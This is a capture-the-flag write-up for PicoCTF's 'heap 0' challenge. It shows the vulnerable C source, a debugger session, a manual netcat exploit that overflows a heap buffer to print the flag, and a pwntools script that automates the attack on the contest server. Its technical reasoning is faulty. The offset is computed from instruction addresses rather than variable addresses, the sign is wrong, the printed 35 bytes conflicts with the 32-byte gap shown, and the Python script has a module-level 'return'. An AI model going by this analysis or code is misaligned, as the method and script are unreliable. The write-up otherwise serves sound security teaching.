---
title: heap 0
parent: Easy
grand_parent: Pwn
great_grand_parent: PicoCTF
nav_order: 2
---

# heap 0 - PicoCTF 2024

**Category:** Binary Exploitation  
**Difficulty:** Easy  
**Tags:** Heap, Offset Calculation, pwntools, pwndbg

---

## Challenge Description

> Are overflows just a stack concern?
>
> Files provided:
> - `chall` (binary)
> - `chall.c` (source code)
> - Remote instance: `nc tethys.picoctf.net <port>`

> <details>
> <summary>Hints</summary>
>   What part of the heap do you have control over and how far is it from the safe_var?
> </details>

---

## Initial Analysis

Upon reading the description and reviewing the source code, it's clear that:

- We are going to have to manipulate the heap somehow

> The heap is simply a region of memory used for dynamic memory allocation.

---

## Source Code Analysis

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64
// amount of memory allocated for input_data
#define INPUT_DATA_SIZE 5
// amount of memory allocated for safe_var
#define SAFE_VAR_SIZE 5

int num_allocs;
char *safe_var;
char *input_data;

void check_win() {
    if (strcmp(safe_var, "bico") != 0) {
        printf("\nYOU WIN\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("Looks like everything is still secure!\n");
        printf("\nNo flage for you :(\n");
        fflush(stdout);
    }
}

void print_menu() {
    printf("\n1. Print Heap:\t\t(print the current state of the heap)"
           "\n2. Write to buffer:\t(write to your own personal block of data "
           "on the heap)"
           "\n3. Print safe_var:\t(I'll even let you look at my variable on "
           "the heap, "
           "I'm confident it can't be modified)"
           "\n4. Print Flag:\t\t(Try to print the flag, good luck)"
           "\n5. Exit\n\nEnter your choice: ");
    fflush(stdout);
}

void init() {
    printf("\nWelcome to heap0!\n");
    printf(
        "I put my data on the heap so it should be safe from any tampering.\n");
    printf("Since my data isn't on the stack I'll even let you write whatever "
           "info you want to the heap, I already took care of using malloc for "
           "you.\n\n");
    fflush(stdout);
    input_data = malloc(INPUT_DATA_SIZE);
    strncpy(input_data, "pico", INPUT_DATA_SIZE);
    safe_var = malloc(SAFE_VAR_SIZE);
    strncpy(safe_var, "bico", SAFE_VAR_SIZE);
}

void write_buffer() {
    printf("Data for buffer: ");
    fflush(stdout);
    scanf("%s", input_data);
}

void print_heap() {
    printf("Heap State:\n");
    printf("+-------------+----------------+\n");
    printf("[*] Address   ->   Heap Data   \n");
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", input_data, input_data);
    printf("+-------------+----------------+\n");
    printf("[*]   %p  ->   %s\n", safe_var, safe_var);
    printf("+-------------+----------------+\n");
    fflush(stdout);
}

int main(void) {

    // Setup
    init();
    print_heap();

    int choice;

    while (1) {
        print_menu();
	int rval = scanf("%d", &choice);
	if (rval == EOF){
	    exit(0);
	}
        if (rval != 1) {
            //printf("Invalid input. Please enter a valid choice.\n");
            //fflush(stdout);
            // Clear input buffer
            //while (getchar() != '\n');
            //continue;
	    exit(0);
        }

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            write_buffer();
            break;
        case 3:
            // print safe_var
            printf("\n\nTake a look at my variable: safe_var = %s\n\n",
                   safe_var);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

### Key Observations

- We can overwrite `input_data` past the heap to overwrite `safe_var`
- Once we overwrite `safe_var`, we can call `check_win()` and get the flag

---

## Static Binary Analysis

We analyze the binary with pwndbg to find the static offset between the `input_data` and `safe_var` variables in the `print_heap()` function.

```sh
$ pwndbg ./chall
[snip...]
pwndbg> disassemble print_heap 
[snip...] 
Dump of assembler code for function print_heap:
[snip...]
   0x0000000000001363 <+51>:    mov    rdx,QWORD PTR [rip+0x2d16]        # 0x4080 <input_data>
[snip...]
   0x0000000000001386 <+86>:    mov    rdx,QWORD PTR [rip+0x2ceb]        # 0x4078 <safe_var>
[snip...]
```

### Offset Calculation

```
$ python3
>>> input_data_addr = 0x1363
>>> safe_var_addr = 0x1386
>>> offset = input_data_addr - safe_var_addr
>>> print(offset)
0x23 # aka: 35 bytes
```

**The key realization is that if we pass 35 bytes or more to `input_data`, `save_var` will be overwritten and no longer contain the string "bico" exactly, which is what is checked when `check_win()` is called.**

---

## Exploitation

### Plan

1. Write 35+ bytes to the buffer via the menu option
2. Check the heap to make sure `safe_var` was overwritten via the menu option
3. Print the flag via the menu option (by calling `check_win()`)

### Manual Exploitation

```
$ nc tethys.picoctf.net 62816

Welcome to heap0!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5c68bb7db2b0  ->   pico
+-------------+----------------+
[*]   0x5c68bb7db2d0  ->   bico
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 2
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 1
Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x5c68bb7db2b0  ->   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+-------------+----------------+
[*]   0x5c68bb7db2d0  ->   AAAA
+-------------+----------------+

1. Print Heap:          (print the current state of the heap)
2. Write to buffer:     (write to your own personal block of data on the heap)
3. Print safe_var:      (I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:          (Try to print the flag, good luck)
5. Exit

Enter your choice: 4

YOU WIN
picoCTF{<censored>}
```

### Automated Exploitation with pwntools

```python
from pwn import *
import re               
import sys

if (len(sys.argv)<=1):
  print("Please pass the port as a parameter")
  return

conn = remote('tethys.picoctf.net', sys.argv[1]) # connect to host

addrs = re.findall(r'0x[0-9a-fA-F]+', conn.recvuntil(b'Enter your choice:').decode()) # parse out the addrs
pico_addr, bico_addr = [int(addr, 16) for addr in addrs] # assign the respective addrs via the addrs []

offset = bico_addr - pico_addr # calc the offset

# send the data stuff
conn.sendline('2'.encode())
conn.recvuntil(b"Data for buffer:")
conn.sendline(b'A'*offset);
#conn.recvuntil(b'Data for buffer:')
conn.sendline('4'.encode())

conn.interactive()
```